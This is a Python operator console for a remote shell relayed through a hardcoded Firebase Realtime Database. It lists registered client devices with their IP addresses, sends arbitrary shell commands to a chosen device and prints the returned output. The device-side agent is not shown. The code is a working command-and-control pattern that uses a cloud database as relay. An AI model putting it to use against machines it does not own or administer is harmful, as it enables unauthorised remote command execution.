import requests
import time

FIREBASE_URL = "https://client-server-connection-446b1-default-rtdb.firebaseio.com"

def list_devices():
    response = requests.get(f"{FIREBASE_URL}/clients.json")
    devices = response.json() or {}
    print("\nAvailable Devices:")
    for i, (device_id, device_data) in enumerate(devices.items(), 1):
        ip = device_data.get('ip', 'N/A')
        print(f"{i}. {device_id} ({ip})")

def send_command(device_id, command):
    requests.patch(f"{FIREBASE_URL}/commands/{device_id}.json", json={"command": command, "output": "", "status": "pending"})
    print(f"Command sent to {device_id}. Waiting for response...")
    
    for _ in range(10):  # Wait 10 seconds max
        response = requests.get(f"{FIREBASE_URL}/commands/{device_id}.json").json() or {}
        if response.get("status") == "completed":
            print("\nOutput:")
            print(response.get("output", ""))
            return
        time.sleep(1)
    print("No response received")

print("Firebase Remote Shell (type 'exit' to quit)")
while True:
    list_devices()
    device_num = input("\nSelect device number (or 'exit'): ")
    
    if device_num.lower() == 'exit':
        break
    
    if not device_num.isdigit():
        print("Please enter a number")
        continue
        
    devices = requests.get(f"{FIREBASE_URL}/clients.json").json() or {}
    device_id = list(devices.keys())[int(device_num)-1] if devices else None
    
    if not device_id:
        print("Invalid device number")
        continue
    
    while True:
        command = input(f"\n[{device_id}] $ ")
        if command.lower() == 'exit':
            break
        if command.lower() == 'back':
            break
        if command:
            command = command.strip()
            if command.startswith("cls"):
                print("\033[H\033[J", end="")
            else:
                send_command(device_id, command)